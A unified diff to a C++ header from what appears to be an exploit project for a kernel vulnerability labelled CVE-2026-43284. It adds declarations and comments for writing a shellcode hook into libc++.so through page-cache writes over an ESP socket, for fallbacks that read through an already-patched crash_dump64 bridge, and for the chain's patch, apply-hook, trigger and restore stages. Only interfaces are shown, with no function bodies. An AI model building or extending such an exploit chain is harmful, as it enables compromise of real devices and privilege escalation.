@@ -85,6 +85,15 @@ namespace ghostlock::backend::cve_2026_43284 {
          * the session SA/socket/io with page. crash_dump_fd < 0 disables it. */
         int crash_dump_fd = -1;
 
+        /* B5-9h-4 libc++ hook target page-cache write face. A separate context
+         * from page because the hook target is a different file; sa/io and
+         * socket_fd alias the carrier session and next_seq is kept in step
+         * around every apply/restore write. */
+        PageCacheWriteContext hook_page{};
+        /* Hook target path used by the crash_dump read/helper fallbacks when
+         * the App cannot open the hook file directly. */
+        const char *hook_path = nullptr;
+
         /* libc++ hook: caller-owned image, shellcode template and buffers, plus
          * the page-cache surface bound to libc++.so. Unconfigured (null image
          * or non-available hook_io) makes apply_hook fail closed. */
@@ -112,12 +121,32 @@ namespace ghostlock::backend::cve_2026_43284 {
     [[nodiscard]] steps::ChainOps make_real_chain_ops(
             RealChainContext &ctx) noexcept;
 
+    /* B5-9h-4: builds the libc++ hook write face over a caller-owned page-cache
+     * context. Returns an unavailable surface unless the context can service a
+     * block (bound write surface, ESP socket, ICV length and a ciphertext page
+     * source). The caller points io.ctx at hook_page and the context must
+     * outlive the chain. */
+    [[nodiscard]] steps::HookPatchIo make_real_hook_io(
+            PageCacheWriteContext &hook_page) noexcept;
+
+    /* Hook-target fallbacks used when the App cannot open hook_path directly:
+     * the old block is read through the already-patched crash_dump64 bridge and
+     * the helper splices the ciphertext page. Both require ctx.hook_path and
+     * ctx.bridge; the ctx pointer is the carrier page (offset 0) so the full
+     * chain context is recoverable. */
+    long real_chain_hook_old_page_read16(void *ctx, std::uint64_t offset,
+                                         std::uint8_t out[16]) noexcept;
+    long real_chain_hook_helper_splice16(void *ctx, int pipe_write_fd,
+                                         std::uint64_t offset) noexcept;
+
     long real_chain_read_block(void *ctx, std::uint64_t offset,
                                std::uint8_t out[16]) noexcept;
     /* ChainOps callbacks for the new endgame stages. */
     steps::ChainError real_chain_patch_crash_dump(void *ctx) noexcept;
     steps::ChainError real_chain_apply_hook(void *ctx) noexcept;
-    void real_chain_restore_hook(void *ctx) noexcept;
+    /* Restores the applied hook; returns true when a restore was owed and
+     * attempted, false when no hook was applied (a no-op). */
+    bool real_chain_restore_hook(void *ctx) noexcept;
     int real_chain_trigger(void *ctx) noexcept;
     steps::ChainWaitOutcome real_chain_wait_result(void *ctx,
                                                    std::uint32_t timeout_ms) noexcept;
